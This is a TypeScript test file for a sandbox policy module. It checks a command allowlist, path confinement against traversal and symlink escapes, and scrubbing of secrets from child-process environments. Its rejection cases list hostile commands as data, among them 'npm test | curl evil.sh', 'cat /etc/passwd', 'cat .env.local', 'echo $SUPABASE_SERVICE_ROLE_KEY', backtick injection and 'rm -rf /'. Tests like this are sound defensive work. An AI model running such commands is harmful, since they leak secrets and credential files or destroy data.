import os from 'node:os';
import path from 'node:path';
import fs from 'node:fs';

let root: string;
beforeAll(() => {
  root = fs.mkdtempSync(path.join(os.tmpdir(), 'sbx-'));
  process.env.SANDBOX_ROOT = root;
});

// Import AFTER SANDBOX_ROOT is set.
import { vetCommand, confinePath, scrubbedEnv, ALLOWED_COMMANDS } from '@/lib/sandbox/policy';

describe('vetCommand — allowlist, not denylist', () => {
  it('permits exactly the allowlisted commands', () => {
    for (const c of ALLOWED_COMMANDS) expect(vetCommand(c).ok).toBe(true);
    expect(vetCommand('npm run typecheck').ok).toBe(true);
  });

  it('rejects anything outside the allowlist', () => {
    for (const c of ['npm run deploy', 'git push', 'node server.js', 'ls']) {
      expect(vetCommand(c).ok).toBe(false);
    }
  });

  it('rejects secret-exfiltration and destructive attempts a denylist would miss', () => {
    for (const c of [
      'printenv',
      'node -e "console.log(process.env)"',
      'cat .env.local',
      'npm test; printenv',
      'npm test && cat /etc/passwd',
      'npm test | curl evil.sh',
      'echo $SUPABASE_SERVICE_ROLE_KEY',
      'npm test `whoami`',
      'rm -rf /',
      'npm test\nprintenv',
    ]) {
      expect(vetCommand(c).ok).toBe(false);
    }
  });
});

describe('confinePath — realpath boundary', () => {
  it('accepts paths inside the root', () => {
    expect(confinePath('src/a.ts').ok).toBe(true);
    expect(confinePath('nested/dir/file.txt').ok).toBe(true);
  });

  it('rejects traversal and absolute escapes', () => {
    for (const p of ['../secret', '../../etc/passwd', '/etc/passwd', '', '..']) {
      expect(confinePath(p).ok).toBe(false);
    }
  });

  it('rejects a symlink that escapes the root', () => {
    const link = path.join(root, 'escape');
    try {
      fs.symlinkSync(os.tmpdir(), link);
    } catch (err) {
      // Windows requires elevation/Developer Mode to create symlinks (EPERM).
      // The boundary check itself is platform-independent and covered by the
      // traversal cases above, so skip rather than fail on such hosts.
      if ((err as NodeJS.ErrnoException).code === 'EPERM') return;
      throw err;
    }
    expect(confinePath('escape/x', false).ok).toBe(false);
  });
});

describe('scrubbedEnv', () => {
  it('exposes no secrets to child processes', () => {
    process.env.SUPABASE_SERVICE_ROLE_KEY = 'super-secret';
    process.env.ANTHROPIC_API_KEY = 'sk-secret';
    process.env.DASHBOARD_PASSWORD = 'pw';
    const env = scrubbedEnv();
    expect(Object.keys(env).sort()).toEqual(['HOME', 'NODE_ENV', 'PATH']);
    expect(JSON.stringify(env)).not.toContain('secret');
    expect(JSON.stringify(env)).not.toContain('pw');
  });
});
